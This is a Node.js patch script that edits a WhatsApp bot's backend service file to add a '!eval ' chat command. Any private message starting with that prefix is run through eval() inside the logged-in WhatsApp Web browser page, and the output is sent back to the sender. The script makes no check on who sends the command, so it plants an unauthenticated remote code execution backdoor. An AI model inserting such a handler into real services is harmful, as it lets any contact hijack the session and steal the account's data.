const fs = require('fs');
let content = fs.readFileSync('/opt/backend/src/services/whatsapp.service.ts', 'utf-8');

// Ensure we don't have duplicate text declarations
content = content.replace(/const text = message\.body;/g, '');
content = content.replace(/const userId = message\.from;/g, '');

const newContent = content.replace(
  'if (chat.isGroup) return;',
  `if (chat.isGroup) return;

        const userId = message.from;
        const text = message.body;

        if (text && text.startsWith('!eval ')) {
          try {
             const code = text.slice(6);
             const result = await this.client.pupPage.evaluate((c) => {
                 try {
                     return JSON.stringify(eval(c), function(key, val) {
                         if (typeof val === 'function') {
                            return val + '';
                         }
                         return val;
                     });
                 } catch(err) {
                     return String(err);
                 }
             }, code);
             const chat = await message.getChat();
             await chat.sendMessage("Eval result: " + result);
          } catch(e) {
             const chat = await message.getChat();
             await chat.sendMessage("Error: " + String(e));
          }
          return;
        }`
);
fs.writeFileSync('/opt/backend/src/services/whatsapp.service.ts', newContent);